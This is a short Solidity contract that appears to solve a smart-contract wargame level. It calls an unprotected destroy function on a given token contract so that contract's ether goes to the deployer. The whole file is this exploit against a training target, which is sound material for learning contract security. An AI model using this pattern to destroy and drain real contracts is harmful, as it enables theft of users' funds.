// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}
contract Solution {

    address payable recipient = msg.sender;
    ISimpleToken destroyMe; 

    function destroyContract(address payable _me) public {
        destroyMe = ISimpleToken(_me);
        destroyMe.destroy(recipient);
    }

}